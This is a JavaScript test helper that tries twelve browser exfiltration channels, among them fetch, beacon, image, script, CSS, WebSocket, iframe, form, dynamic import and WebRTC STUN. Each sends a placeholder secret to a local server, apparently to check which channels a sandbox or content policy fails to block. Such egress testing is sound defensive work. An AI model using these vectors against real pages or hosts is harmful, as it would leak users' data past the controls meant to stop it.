// Every exfiltration vector we can attempt from a page, each tagged so the
// receiving server tells us which ones actually established egress.
window.__tryAll = async function (tag) {
  const U = (v) => `http://127.0.0.1:8973/${tag}-${v}?secret=BILLTEXT`;
  const out = [];
  const t = async (name, fn) => { try { await fn(); out.push(name + ":attempted"); } catch (e) { out.push(name + ":threw(" + e.name + ")"); } };
  await t("fetch",     () => fetch(U("fetch"), { mode: "no-cors" }));
  await t("xhr",       () => { const x = new XMLHttpRequest(); x.open("GET", U("xhr")); x.send(); });
  await t("beacon",    () => { navigator.sendBeacon(U("beacon"), "data"); });
  await t("img",       () => { const i = new Image(); i.src = U("img"); document.body.appendChild(i); });
  await t("script",    () => { const s = document.createElement("script"); s.src = U("script"); document.body.appendChild(s); });
  await t("css",       () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = U("css"); document.head.appendChild(l); });
  await t("websocket", () => { new WebSocket("ws://127.0.0.1:8973/" + tag + "-ws"); });
  await t("eventsrc",  () => { new EventSource(U("eventsource")); });
  await t("iframe",    () => { const f = document.createElement("iframe"); f.src = U("iframe"); document.body.appendChild(f); });
  await t("form",      () => { const f = document.createElement("form"); f.method = "POST"; f.action = U("form");
                               f.target = "_blank"; document.body.appendChild(f); });
  await t("dynimport", () => import(U("dynimport")));
  await t("webrtc",    () => { const p = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:8973" }] });
                               p.createDataChannel("x"); return p.createOffer().then((o) => p.setLocalDescription(o)); });
  await new Promise((r) => setTimeout(r, 1500));
  return out.join("\n");
};
